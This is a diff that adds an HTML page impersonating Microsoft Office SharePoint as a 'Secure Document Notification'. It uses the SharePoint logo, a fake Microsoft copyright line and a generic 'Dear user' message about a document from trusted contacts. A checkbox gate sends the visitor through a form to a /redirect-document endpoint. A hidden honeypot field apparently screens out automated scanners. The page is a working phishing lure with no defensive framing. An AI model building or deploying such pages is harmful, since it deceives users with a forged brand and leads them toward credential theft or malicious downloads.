@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Office SharePoint - Secure Document</title>
+  <link rel="stylesheet" href="/static/style.css" />
+</head>
+<body>
+  <main class="card">
+    <img class="logo" alt="SharePoint" src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Microsoft_Office_SharePoint_%282019%E2%80%93present%29.svg">
+    <h1>Office SharePoint</h1>
+    <h2>Secure Document Notification</h2>
+
+    <p class="lead">Dear user,</p>
+    <p class="muted">You have received a secure document from one of your trusted contacts. To view the document, confirm that you understand you'll be redirected to the secure viewer.</p>
+
+    <!-- FORM START -->
+    <form action="/redirect-document" method="GET">
+      <label class="checkbox-label">
+        <input id="confirmBox" type="checkbox" />
+        <span class="checkmark" aria-hidden="true"></span>
+        I understand this link will redirect me to view the document securely.
+      </label>
+
+      <!-- Honeypot field -->
+      <input type="text" name="hp_field" id="hp_field" style="display:none" tabindex="-1" autocomplete="off" />
+
+      <button id="viewBtn" class="btn disabled" type="submit" disabled>View Document</button>
+    </form>
+    <!-- FORM END -->
+
+    <footer class="footer">
+      <small>© 2025 Microsoft Corporation. All rights reserved.</small>
+    </footer>
+  </main>
+
+  <script>
+    const confirmBox = document.getElementById('confirmBox');
+    const viewBtn = document.getElementById('viewBtn');
+
+    function enableButton() {
+      viewBtn.classList.remove('disabled');
+      viewBtn.removeAttribute('disabled');
+    }
+
+    function disableButton() {
+      viewBtn.classList.add('disabled');
+      viewBtn.setAttribute('disabled', 'true');
+    }
+
+    confirmBox.addEventListener('change', (e) => {
+      if (e.target.checked) enableButton();
+      else disableButton();
+    });
+
+    // Accessibility: allow Enter/Space to submit if enabled
+    viewBtn.addEventListener('keydown', (e) => {
+      if ((e.key === 'Enter' || e.key === ' ') && !viewBtn.classList.contains('disabled')) {
+        e.preventDefault();
+        e.target.closest('form').submit();
+      }
+    });
+  </script>
+</body>
+</html>
